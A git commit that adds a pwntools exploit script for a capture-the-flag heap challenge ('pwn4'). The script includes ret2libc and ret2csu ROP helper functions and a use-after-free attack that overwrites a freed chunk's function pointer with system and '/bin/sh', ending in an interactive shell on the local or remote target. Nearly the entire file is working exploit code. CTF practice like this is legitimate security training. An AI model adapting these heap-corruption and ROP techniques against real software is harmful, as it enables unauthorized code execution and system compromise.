de7c1372690eb564848bc4a561db7a99adb049b3
CySRSLNK <2686306289@qq.com>
2025-03-14 18:56:47 +0800

    新增吉林省赛10pwn4

---
+++ pwn/吉林省赛10/pwn4/exp.py
@@ -0,0 +1,113 @@
+#!/usr/bin/python3
+# -*- coding: UTF-8 -*-
+
+from pwn import *
+from LibcSearcher import *
+from sys import argv
+
+local = 1
+if 'r' in argv:	local = 0
+#libc_path = 'libc.so.6'
+os_level = 64
+binary_name = 'pwn4'#uaf
+remote_addr, port = ':'.split(':')
+
+if local:
+    p = process('./' + binary_name)
+    elf = ELF('./' + binary_name)
+    #libc = elf.libc
+else:
+    log.warning('!!REMOTE!!')
+    p = remote(remote_addr, port)
+    elf = ELF('./' + binary_name)
+
+if os_level == 64:
+    context(log_level='debug', os='linux', arch='amd64', bits=64)
+    if local: libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
+elif os_level == 32:
+    context(log_level='debug', os='linux', arch='i386', bits=32)
+    if local: libc_path = 'lib/i386-linux-gnu/libc.so.6'
+else:
+    print('Error os!!!')
+    exit()
+#libc = ELF(libc_path)
+#context.terminal = ['/usr/bin/x-terminal-emulator', '-e']
+
+ru = lambda x: p.recvuntil(x)
+rc = lambda x: p.recv(x)
+rl = lambda: p.recvline()
+sl = lambda x: p.sendline(x)
+sd = lambda x: p.send(x)
+sda = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+leak = lambda name,addr: log.success('{}--> {:#x}'.format(name,addr))
+uu32 = lambda data: u32(data.ljust(4,b'\x00'))
+uu64 = lambda data: u64(data.ljust(8,b'\x00'))
+slp = lambda x: sleep(x)
+
+def dbg():
+    if local:
+        gdb.attach(p)
+        pause()
+    else:
+        pass
+
+def ret2libc(leak:int,funcname:bytes,path=''):
+    if path == '':
+        libc = LibcSearcher(funcname,leak)
+        base = leak - libc.dump(funcname)
+        system = base + libc.dump('system')
+        bin_sh = base + libc.dump('str_bin_sh')
+
+    else:
+        libc = ELF(path)
+        base = leak - libc.sym[funcname]
+        system = base + libc.sym['system']
+        bin_sh = base + next(libc.search(b'/bin/sh'))
+
+    return (system, bin_sh)
+def csu(offset,r12, r13, r14, r15, last,csu_end_addr,csu_front_addr):
+    # pop rbx,rbp,r12,r13,r14,r15
+    # rbx should be 0
+    # rbp should be 1,enable not to jump
+    # r12 should be the function we want to call
+    # rdx=r13
+    # rsi=r14
+    # rdi=edi=r15d
+    payload = b'a'*offset + b'b'*0x8
+    payload += p64(csu_end_addr) + p64(0) + p64(1) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload += p64(csu_front_addr)
+    payload += b'a' * 0x38
+    payload += p64(last)
+    return payload
+
+def add(size,content):
+    sla(b'choice: ',b'1')
+    sla(b'size: ',str(size))
+    sda(b'content: ',content)
+
+def delete(index):
+    sla(b'choice: ',b'2')
+    sla(b'index: ',str(index))
+
+def show(index):
+    sla(b'choice: ',b'3')
+    sla(b'index: ',str(index))
+
+#Main function
+if __name__ == '__main__':
+    #you can add your code here
+    bin_sh = 0x602010
+    system = elf.plt['system']
+    leak(b'system',system)
+    
+    add(0x80,'aaaa')
+    add(0x80,'bbbb')
+    add(0x80,'cccc')
+
+    delete(1)
+    delete(0)
+
+    add(0x10,p64(bin_sh) + p64(system))
+    show(1)
+    p.interactive()
